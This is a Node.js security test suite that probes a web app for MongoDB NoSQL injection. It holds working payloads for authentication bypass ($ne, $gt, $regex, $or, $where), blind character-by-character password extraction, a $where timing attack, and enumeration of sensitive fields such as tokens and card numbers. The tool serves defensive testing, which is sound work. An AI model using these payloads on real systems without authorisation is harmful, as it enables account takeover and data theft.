import { fileURLToPath } from 'url'
import { startCapture, writeReport } from './html-reporter.mjs'

const R = '\x1b[0m', GREEN = '\x1b[32m', RED = '\x1b[31m',
      YLW = '\x1b[33m', BOLD = '\x1b[1m', DIM = '\x1b[2m', CYAN = '\x1b[36m'

// ── Helpers ────────────────────────────────────────────────────────────────────
function makeStats()  { return { passed: 0, failed: 0, errored: 0, skipped: 0 } }

function makeResult(stats) {
  return function result(label, status, detail = '') {
    const map = {
      pass: { sym: '✓', col: GREEN, key: 'passed'  },
      fail: { sym: '✗', col: RED,   key: 'failed'  },
      err:  { sym: '?', col: YLW,   key: 'errored' },
      skip: { sym: '–', col: DIM,   key: 'skipped' },
    }
    const { sym, col, key } = map[status]
    stats[key]++
    const det = detail ? ` ${DIM}${detail}${R}` : ''
    console.log(`    ${col}${sym}${R} ${label}${det}`)
  }
}

function section(title) { console.log(`\n${BOLD}${CYAN}▸ ${title}${R}`) }

async function req(url, opts = {}) {
  const t0 = Date.now()
  try {
    const res = await fetch(url, { redirect: 'manual', signal: AbortSignal.timeout(10000), ...opts })
    const elapsed = Date.now() - t0
    let body = ''
    try { body = await res.text() } catch {}
    let json = null
    try { json = JSON.parse(body) } catch {}
    return { status: res.status, body, json, elapsed, headers: res.headers, ok: res.status < 400 }
  } catch (e) {
    return { status: 0, body: '', json: null, elapsed: Date.now() - t0, error: e.message }
  }
}

// ── NoSQL-specific helpers ─────────────────────────────────────────────────────

// Common authentication endpoint paths
const AUTH_PATHS = [
  '/api/auth', '/api/login', '/api/signin', '/api/auth/login',
  '/auth', '/auth/login', '/login', '/signin',
  '/api/user/login', '/api/users/login', '/api/session', '/api/token',
  '/api/account/login', '/api/v1/auth', '/api/v1/login',
]

// Common credential field name pairs to try
const CRED_PAIRS = [
  { user: 'username', pass: 'password' },
  { user: 'email',    pass: 'password' },
  { user: 'user',     pass: 'pass'     },
  { user: 'login',    pass: 'password' },
  { user: 'email',    pass: 'passwd'   },
]

// Common username values for targeted operator injection
const TARGET_USERS = ['admin', 'administrator', 'root', 'user', 'test', 'support']

// Sensitive field names to probe in category 3
const SENSITIVE_FIELDS = [
  'password', 'passwordHash', 'hashedPassword', 'pwd', 'pass',
  'token', 'apiKey', 'api_key', 'secretKey', 'secret', 'privateKey',
  'resetToken', 'verificationToken', 'authToken', 'accessToken', 'refreshToken',
  'twoFactorSecret', 'totpSecret', 'mfaSecret', 'backupCodes',
  'role', 'isAdmin', 'admin', 'permissions', 'accessLevel', 'superuser',
  'ssn', 'socialSecurityNumber', 'dob', 'dateOfBirth',
  'creditCard', 'cardNumber', 'cvv', 'bankAccount', 'routingNumber',
  'balance', 'accountNumber', 'internalNote', 'privateData',
]

// Character set for regex-based value extraction
const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*'

// POST JSON request shorthand
async function postJson(url, body, headers = {}) {
  return req(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
  })
}

// Heuristic: does this response look like a successful authentication?
function isAuthSuccess(r) {
  if (!r || r.status === 0) return false
  const hasCookie = !!r.headers?.get?.('set-cookie')
  const hasToken  = !!(r.json?.token || r.json?.accessToken || r.json?.access_token ||
                       r.json?.jwt   || r.json?.sessionId   || r.json?.session_id)
  const hasUser   = !!(r.json?.user  || r.json?.data?.user  || r.json?.account)
  const hasFlag   = r.json?.success === true || r.json?.authenticated === true ||
                    r.json?.isAuth === true   || r.json?.ok === true
  return r.ok && (hasCookie || hasToken || hasUser || hasFlag)
}

// Returns true if two responses are "meaningfully different" — used to detect
// operator injection effects (different status, significantly different body length)
function responsesDiffer(a, b) {
  if (!a || !b) return false
  if (a.status !== b.status) return true
  const lenDiff = Math.abs((a.body?.length || 0) - (b.body?.length || 0))
  if (lenDiff > 30) return true   // body grew or shrank — new data or different error message
  if (a.ok !== b.ok) return true
  return false
}

// Build a probe target list from the endpoint list + auth path fallbacks
function authTargets(base, endpoints = []) {
  const seen = new Set()
  const out  = []

  for (const ep of endpoints.filter(e => ['POST', 'PUT'].includes(e.method) &&
      /login|auth|signin|session|token/i.test(e.path))) {
    const url = `${base}${ep.path}`
    if (seen.has(url)) continue
    seen.add(url)
    out.push({ url, fields: ep.bodyFields || [] })
  }

  for (const p of AUTH_PATHS) {
    const url = `${base}${p}`
    if (seen.has(url)) continue
    seen.add(url)
    out.push({ url, fields: [] })
  }

  return out
}

// Build a list of data endpoints (GET, authenticated)
function dataTargets(base, endpoints = []) {
  const seen = new Set()
  const out  = []

  for (const ep of endpoints.filter(e => e.method === 'GET')) {
    const url = `${base}${ep.path.replace(/:([a-zA-Z_]+)/g, '1')}`
    if (seen.has(url)) continue
    seen.add(url)
    out.push({ url, fields: ep.queryParams || [] })
  }

  for (const p of ['/api/users', '/api/user', '/api/me', '/api/profile', '/api/admin/users']) {
    const url = `${base}${p}`
    if (seen.has(url)) continue
    seen.add(url)
    out.push({ url, fields: [] })
  }

  return out
}

// ══════════════════════════════════════════════════════════════════════════════
// 1. EXPLOITING NoSQL OPERATOR INJECTION TO BYPASS AUTHENTICATION
//
// MongoDB query operators ($ne, $gt, $regex, $exists, $or, $where) can be
// injected into JSON request bodies or query strings to short-circuit login
// logic. The server builds a query like:
//   db.users.findOne({ username: req.body.username, password: req.body.password })
// When the attacker sends { password: { $ne: null } } the query matches ANY
// document whose password field exists — authentication is bypassed entirely.
// ══════════════════════════════════════════════════════════════════════════════
export async function testNoSqlAuthBypass(base, endpoints = [], cookie, result) {
  section('1 · NoSQL operator injection — authentication bypass')

  const targets = authTargets(base, endpoints)
  const authH   = cookie ? { Cookie: cookie } : {}

  // Operator injection payloads grouped by technique
  const TECHNIQUES = [
    {
      label: '$ne: null — password field bypass',
      builds: (uf, pf, user) => ({ [uf]: user, [pf]: { $ne: null } }),
    },
    {
      label: '$ne: "" — both fields bypass',
      builds: (uf, pf) => ({ [uf]: { $ne: '' }, [pf]: { $ne: '' } }),
    },
    {
      label: '$gt: "" — both fields bypass',
      builds: (uf, pf) => ({ [uf]: { $gt: '' }, [pf]: { $gt: '' } }),
    },
    {
      label: '$regex: .* — password matches anything',
      builds: (uf, pf, user) => ({ [uf]: user, [pf]: { $regex: '.*' } }),
    },
    {
      label: '$exists: true — field presence check',
      builds: (uf, pf, user) => ({ [uf]: user, [pf]: { $exists: true } }),
    },
    {
      label: '$or with $ne: null — multi-condition bypass',
      builds: (uf, pf) => ({
        $or: TARGET_USERS.map(u => ({ [uf]: u })),
        [pf]: { $ne: null },
      }),
    },
    {
      label: '$where: return true — JavaScript operator',
      builds: (uf, pf) => ({ $where: 'function(){ return true }' }),
    },
  ]

  console.log(`\n    ${DIM}Probing ${Math.min(targets.length, 5)} auth endpoints × ${CRED_PAIRS.length} field pairs × ${TECHNIQUES.length} operator techniques...${R}`)

  let testedAny = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 5)) {
    for (const { user: uf, pass: pf } of CRED_PAIRS) {

      // Baseline: wrong password — establishes what a failed login looks like
      const baseline = await postJson(url,
        { [uf]: TARGET_USERS[0], [pf]: 'WRONGPASSWORD_NOSQL_BASELINE_XYZ' }, authH)
      if (baseline.status === 0 || baseline.status === 404) continue
      testedAny = true

      // Skip if baseline itself looks like success (endpoint doesn't authenticate)
      if (isAuthSuccess(baseline)) continue

      for (const user of TARGET_USERS) {
        for (const { label, builds } of TECHNIQUES) {
          const payload = builds(uf, pf, user)
          const r = await postJson(url, payload, authH)
          if (r.status === 0) continue

          if (isAuthSuccess(r)) {
            foundVuln = true
            result(`NoSQL auth bypass — ${label}  [POST ${url.replace(base, '')}]`,
                   'fail',
                   `baseline: HTTP ${baseline.status} → injected: HTTP ${r.status} — operator evaluated; login bypassed`)
            break
          } else if (responsesDiffer(baseline, r)) {
            result(`NoSQL operator accepted (different response) — ${label}  [POST ${url.replace(base, '')}]`,
                   'err',
                   `baseline ${baseline.status} vs injected ${r.status} — operator may be processed; review manually`)
          }
        }
        if (foundVuln) break
      }
      if (foundVuln) break

      // Also test query-string operator injection (Express qs-parser extended syntax)
      // e.g. POST body as application/x-www-form-urlencoded: username[$ne]=&password[$ne]=
      const qsPayload = `${uf}[$ne]=NOSQLTEST&${pf}[$ne]=NOSQLTEST`
      const rQs = await req(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...authH },
        body: qsPayload,
      })
      if (rQs.status !== 0 && rQs.status !== 404) {
        if (isAuthSuccess(rQs)) {
          foundVuln = true
          result(`NoSQL auth bypass — query-string [$ne] operator  [POST ${url.replace(base, '')}]`,
                 'fail',
                 `${uf}[$ne]=&${pf}[$ne]= accepted — Express qs parser converts bracketed params to { $ne: "" } object`)
        }
      }

      if (foundVuln) break
    }
    if (foundVuln) break
  }

  if (!testedAny) {
    result('No reachable auth endpoints found', 'skip',
           'provide an endpoint list or ensure the app is running with an auth route')
  } else if (!foundVuln) {
    result('NoSQL auth bypass — no operator injection accepted on sampled auth endpoints', 'pass',
           'operator payloads rejected or produced identical failure responses')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 2. EXPLOITING NoSQL INJECTION TO EXTRACT DATA
//
// Once operator injection is confirmed, $regex can enumerate field values
// character-by-character. Each probe sends { field: { $regex: "^<prefix>" } }
// and compares the response to the baseline failure — a differing response
// means the regex matched, revealing one more character of the value.
//
// $where with JavaScript (when enabled) allows arbitrary JS execution:
//   { $where: "sleep(2000) || true" } — blind timing confirms JS runs
//   { $where: "this.password.match(/^a/)" } — char-by-char value leak
// ══════════════════════════════════════════════════════════════════════════════
export async function testNoSqlDataExtraction(base, endpoints = [], cookie, result) {
  section('2 · NoSQL injection — data extraction via $regex and $where')

  const targets = authTargets(base, endpoints)
  const authH   = cookie ? { Cookie: cookie } : {}

  let testedAny = false
  let foundVuln = false

  for (const { url } of targets.slice(0, 5)) {
    for (const { user: uf, pass: pf } of CRED_PAIRS) {

      // Baseline failure
      const baseline = await postJson(url,
        { [uf]: TARGET_USERS[0], [pf]: 'WRONGPASSWORD_BASELINE_XYZ' }, authH)
      if (baseline.status === 0 || baseline.status === 404) continue
      if (isAuthSuccess(baseline)) continue
      testedAny = true

      // ── 2a. Confirm $regex operator is evaluated on the password field ──────
      // Match-all regex — should behave like $ne: null if operators are evaluated
      const rRegexAll = await postJson(url,
        { [uf]: TARGET_USERS[0], [pf]: { $regex: '.*' } }, authH)

      // Non-matching regex — should produce same result as baseline
      const rRegexNone = await postJson(url,
        { [uf]: TARGET_USERS[0], [pf]: { $regex: '^ZZZZZZZZZZZZZZ_NOMATCH_99887766$' } }, authH)

      const regexEvaluated = responsesDiffer(baseline, rRegexAll) &&
                             !responsesDiffer(baseline, rRegexNone)

      if (regexEvaluated) {
        foundVuln = true
        result(`$regex operator evaluated on "${pf}" field  [POST ${url.replace(base, '')}]`,
               'fail',
               `match-all → HTTP ${rRegexAll.status}, no-match → HTTP ${rRegexNone.status} — $regex is processed; character-by-character value extraction is possible`)

        // ── 2b. Proof-of-concept: extract first character of the password ────
        console.log(`\n    ${DIM}Probing first character of "${pf}" for admin user via regex...${R}`)
        let foundFirst = false
        for (const ch of CHARSET) {
          const rChar = await postJson(url,
            { [uf]: TARGET_USERS[0], [pf]: { $regex: `^${ch}` } }, authH)

          if (responsesDiffer(baseline, rChar)) {
            foundFirst = true
            foundVuln  = true
            result(`Data extraction — "${pf}" starts with "${ch}" for user "${TARGET_USERS[0]}"`,
                   'fail',
                   `{ ${pf}: { $regex: "^${ch}" } } → HTTP ${rChar.status} (differs from baseline ${baseline.status}) — blind regex extraction confirmed`)
            break
          }
        }
        if (!foundFirst) {
          result(`$regex extraction — first character of "${pf}" not determined (no match in charset)`,
                 'err', 'regex evaluated but no charset character produced a different response — field may be empty or hashed')
        }
      }

      // ── 2c. $where timing attack — confirms JavaScript execution ────────────
      console.log(`\n    ${DIM}Testing $where JavaScript execution via timing (2 s sleep)...${R}`)
      const SLEEP_MS = 2000
      const rWhere = await postJson(url,
        { $where: `function(){ var d=new Date(); var t=d.getTime(); while(new Date().getTime() < t+${SLEEP_MS}){} return false; }` },
        authH)

      if (rWhere.elapsed >= SLEEP_MS - 200 && rWhere.status !== 0) {
        foundVuln = true
        result(`$where operator executes JavaScript — timing attack confirmed  [POST ${url.replace(base, '')}]`,
               'fail',
               `response took ${rWhere.elapsed}ms (threshold ${SLEEP_MS}ms) — server-side JS runs inside MongoDB $where; arbitrary expressions possible`)
      } else if (rWhere.status !== 0 && rWhere.status !== 404) {
        result('$where timing attack', 'pass',
               `response in ${rWhere.elapsed}ms — no delay observed; $where JS execution appears blocked or disabled`)
      }

      // ── 2d. $where field value extraction (if $where is available) ──────────
      for (const user of TARGET_USERS.slice(0, 2)) {
        for (const ch of CHARSET.slice(0, 8)) {  // sample first 8 chars as PoC
          const rWhereChar = await postJson(url,
            { [uf]: user, $where: `function(){ return this.${pf} && this.${pf}.match(/^${ch}/) }` },
            authH)
          if (rWhereChar.status === 0) continue

          if (responsesDiffer(baseline, rWhereChar)) {
            foundVuln = true
            result(`$where data extraction — "${pf}" for "${user}" starts with "${ch}"`,
                   'fail',
                   `$where + regex PoC confirmed — full blind extraction possible character by character`)
            break
          }
        }
      }

      if (foundVuln) break
    }
    if (foundVuln) break
  }

  // ── 2e. Also probe data endpoints for injection in GET query parameters ────
  const data = dataTargets(base, endpoints)
  const getH = cookie ? { Cookie: cookie } : {}

  for (const { url } of data.slice(0, 6)) {
    // Try injecting $where into query params (e.g. ?id[$where]=...)
    const probeUrl = `${url}?id[$where]=function(){return true}&id[$ne]=`
    const r = await req(probeUrl, { headers: getH })
    if (r.status === 0 || r.status === 404) continue
    testedAny = true

    // Baseline without operator injection
    const rClean = await req(`${url}?id=1`, { headers: getH })
    if (responsesDiffer(rClean, r) && r.ok) {
      foundVuln = true
      result(`NoSQL operator injection in GET query param  [GET ${url.replace(base, '')}?id[$where]=...]`,
             'fail',
             `injected [$where] or [$ne] in URL → HTTP ${r.status} (baseline: ${rClean.status}) — query param parsed as MongoDB operator`)
    }
  }

  if (!testedAny) {
    result('No reachable endpoints for NoSQL data extraction probing', 'skip',
           'ensure the app is running and has a login or data endpoint')
  } else if (!foundVuln) {
    result('NoSQL data extraction — $regex and $where operators appear blocked or not evaluated', 'pass',
           'no timing delay, no regex-driven response difference detected in sampled endpoints')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// 3. EXPLOITING NoSQL OPERATOR INJECTION TO EXTRACT UNKNOWN FIELDS
//
// When the database schema is unknown, attackers enumerate field names using:
//   { "unknownField": { "$exists": true } } — true/false based on field presence
//   { "$where": "Object.keys(this).indexOf('fieldname') >= 0" } — field name enumeration
//   { "$where": "JSON.stringify(Object.keys(this))" } — dump all field names
//
// The $exists operator is always available (no JS required). A response
// different from the baseline indicates the tested field exists in the document.
// ══════════════════════════════════════════════════════════════════════════════
export async function testNoSqlFieldEnumeration(base, endpoints = [], cookie, result) {
  section('3 · NoSQL operator injection — unknown field enumeration')

  const targets = authTargets(base, endpoints)
  const authH   = cookie ? { Cookie: cookie } : {}

  let testedAny  = false
  let foundVuln  = false
  const foundFields = []

  // ── 3a. $exists field probing on auth endpoints ────────────────────────────
  for (const { url } of targets.slice(0, 5)) {
    for (const { user: uf, pass: pf } of CRED_PAIRS) {

      // Baseline failure with a definitely non-existent field
      const baseline = await postJson(url,
        { [uf]: TARGET_USERS[0], [pf]: 'WRONGPASSWORD_BASELINE_XYZ' }, authH)
      if (baseline.status === 0 || baseline.status === 404) continue
      if (isAuthSuccess(baseline)) continue
      testedAny = true

      // Sanity check: $exists: false on a non-existent field should match nothing
      const rNoField = await postJson(url,
        { [uf]: TARGET_USERS[0], nonExistentField_xyzzy99: { $exists: true } }, authH)
      if (!responsesDiffer(baseline, rNoField)) {
        // $exists is evaluated (no-field probe didn't change anything, as expected)
        // Now probe sensitive field names
        console.log(`\n    ${DIM}Probing ${SENSITIVE_FIELDS.length} sensitive field names via $exists on ${url.replace(base, '')}...${R}`)

        for (const field of SENSITIVE_FIELDS) {
          const rExists = await postJson(url,
            { [uf]: TARGET_USERS[0], [field]: { $exists: true } }, authH)
          if (rExists.status === 0) continue

          if (responsesDiffer(baseline, rExists)) {
            foundVuln = true
            foundFields.push(field)
            result(`$exists field enumeration — field "${field}" exists in user document  [POST ${url.replace(base, '')}]`,
                   'fail',
                   `{ ${field}: { $exists: true } } → HTTP ${rExists.status} (baseline: ${baseline.status}) — field name confirmed in MongoDB collection`)
          }
        }
      }

      // ── 3b. $where Object.keys() — enumerate all field names ────────────────
      console.log(`\n    ${DIM}Testing $where Object.keys() field name dump...${R}`)

      // First check if $where with Object.keys runs (timing probe)
      const t0 = Date.now()
      const rKeys = await postJson(url,
        { $where: `function(){ return Object.keys(this).length > 0 }` }, authH)
      const elapsed = Date.now() - t0

      if (rKeys.status !== 0 && responsesDiffer(baseline, rKeys)) {
        foundVuln = true
        result(`$where Object.keys() — schema enumeration via JavaScript  [POST ${url.replace(base, '')}]`,
               'fail',
               `$where evaluated — attacker can enumerate all field names: { $where: "Object.keys(this).join(',')" }`)

        // Confirm specific sensitive field names via $where
        for (const field of SENSITIVE_FIELDS.slice(0, 10)) {
          const rField = await postJson(url,
            { $where: `function(){ return Object.keys(this).indexOf('${field}') >= 0 }` }, authH)
          if (rField.status === 0) continue

          if (responsesDiffer(baseline, rField)) {
            if (!foundFields.includes(field)) foundFields.push(field)
            result(`$where Object.keys() — field "${field}" confirmed  [POST ${url.replace(base, '')}]`,
                   'fail',
                   `Object.keys(this).indexOf('${field}') returned true — field exists in document`)
          }
        }
      } else if (rKeys.status !== 0) {
        result('$where Object.keys() field enumeration', 'pass',
               `HTTP ${rKeys.status} — $where JavaScript appears disabled; schema enumeration via JS blocked`)
      }

      if (foundVuln) break
    }
    if (foundVuln) break
  }

  // ── 3c. $exists injection via query parameters on data endpoints ───────────
  const data  = dataTargets(base, endpoints)
  const getH  = cookie ? { Cookie: cookie } : {}

  for (const { url } of data.slice(0, 6)) {
    const rClean = await req(`${url}?id=1`, { headers: getH })
    if (rClean.status === 0 || rClean.status === 404) continue
    testedAny = true

    for (const field of SENSITIVE_FIELDS.slice(0, 8)) {
      // Inject $exists via query string: ?field[$exists]=true
      const probeUrl = `${url}?${field}[$exists]=true&id=1`
      const r = await req(probeUrl, { headers: getH })
      if (r.status === 0) continue

      if (responsesDiffer(rClean, r) && r.ok) {
        foundVuln = true
        if (!foundFields.includes(field)) foundFields.push(field)
        result(`$exists query-param injection — field "${field}" exists in collection  [GET ${url.replace(base, '')}]`,
               'fail',
               `?${field}[$exists]=true → HTTP ${r.status} (baseline: ${rClean.status}) — field name confirmed via GET query string`)
      }
    }
  }

  // ── Summary ──────────────────────────────────────────────────────────────────
  if (foundFields.length > 0) {
    console.log(`\n    ${DIM}Fields confirmed present in MongoDB documents: ${foundFields.join(', ')}${R}`)
  }

  if (!testedAny) {
    result('No reachable endpoints for NoSQL field enumeration probing', 'skip',
           'ensure the app is running with a MongoDB-backed auth or data endpoint')
  } else if (!foundVuln) {
    result('NoSQL field enumeration — $exists and $where appear blocked or produce no response difference', 'pass',
           'operators either not evaluated or return identical responses regardless of field presence')
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// FULL SUITE RUNNER
// ══════════════════════════════════════════════════════════════════════════════
/**
 * Run the complete NoSQL injection security test suite.
 * @param {object}   opts
 * @param {string}   opts.base        App base URL (e.g. http://localhost:3000)
 * @param {object[]} [opts.endpoints] Endpoint list from scanProject()
 * @param {string}   [opts.cookie]    Authenticated session cookie string
 */
export async function runNoSqlTests({ base, endpoints = [], cookie } = {}) {
  const stats  = makeStats()
  const result = makeResult(stats)

  try {
    await fetch(base, { signal: AbortSignal.timeout(4000) })
  } catch {
    console.error(`\n${RED}✗ Server not reachable at ${base}${R}`)
    process.exit(1)
  }

  await testNoSqlAuthBypass(base, endpoints, cookie, result)
  await testNoSqlDataExtraction(base, endpoints, cookie, result)
  await testNoSqlFieldEnumeration(base, endpoints, cookie, result)

  return stats
}

// ══════════════════════════════════════════════════════════════════════════════
// CLI entry
// ══════════════════════════════════════════════════════════════════════════════
export async function main(argv = process.argv.slice(2)) {
  const base     = argv.find(a => a.startsWith('http')) || 'http://localhost:3000'
  const email    = process.env.TEST_EMAIL    || ''
  const password = process.env.TEST_PASSWORD || ''

  startCapture()
  console.log(`\n${BOLD}╔══════════════════════════════════════════════╗`)
  console.log(`║  NoSQL Injection Security Test Suite        ║`)
  console.log(`╚══════════════════════════════════════════════╝${R}`)
  console.log(`Target : ${base}`)
  console.log(`Date   : ${new Date().toISOString()}`)

  let endpoints = []
  const projectPath = argv.find(a => !a.startsWith('http') && !a.startsWith('--'))
  if (projectPath) {
    try {
      const { scanProject } = await import('./list-endpoints.mjs')
      const r = scanProject(projectPath)
      endpoints = r.endpoints
      console.log(`${GREEN}✓ Loaded ${endpoints.length} endpoints from ${projectPath}${R}`)
    } catch (e) {
      console.log(`${YLW}⚠ Could not scan project: ${e.message}${R}`)
    }
  }

  let cookie = null
  if (email && password) {
    process.stdout.write(`\nAuthenticating as ${email}... `)
    const origin = base.replace(/\/api.*$/, '')
    try {
      const res = await fetch(`${origin}/api/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      })
      if (res.ok) {
        const sc = res.headers.get('set-cookie')
        const m  = sc?.match(/AUTH=([^;]+)/)
        cookie   = m ? `AUTH=${m[1]}` : null
      }
    } catch {}
    console.log(cookie ? `${GREEN}✓${R}` : `${YLW}failed${R}`)
  }

  const stats = await runNoSqlTests({ base, endpoints, cookie })

  const total = Object.values(stats).reduce((a, b) => a + b, 0)
  console.log(`\n${BOLD}╔══════════════════════════════════════════════╗`)
  console.log(`║  Results                                     ║`)
  console.log(`╚══════════════════════════════════════════════╝${R}`)
  console.log(`  ${GREEN}Passed  (safe)       : ${stats.passed}${R}`)
  console.log(`  ${RED}Failed  (vulnerable) : ${stats.failed}${R}`)
  console.log(`  ${YLW}Errors               : ${stats.errored}${R}`)
  console.log(`  ${DIM}Skipped              : ${stats.skipped}${R}`)
  console.log(`  Total                : ${total}`)

  await writeReport({ title: 'NoSQL Injection Test Suite', target: base, stats })

  if (stats.failed > 0) {
    console.log(`\n${RED}${BOLD}⚠  Vulnerabilities found — review FAIL lines above.${R}\n`)
    process.exit(1)
  } else {
    console.log(`\n${GREEN}${BOLD}✓  All executed tests passed.${R}\n`)
  }
}

if (process.argv[1] === fileURLToPath(import.meta.url)) main()
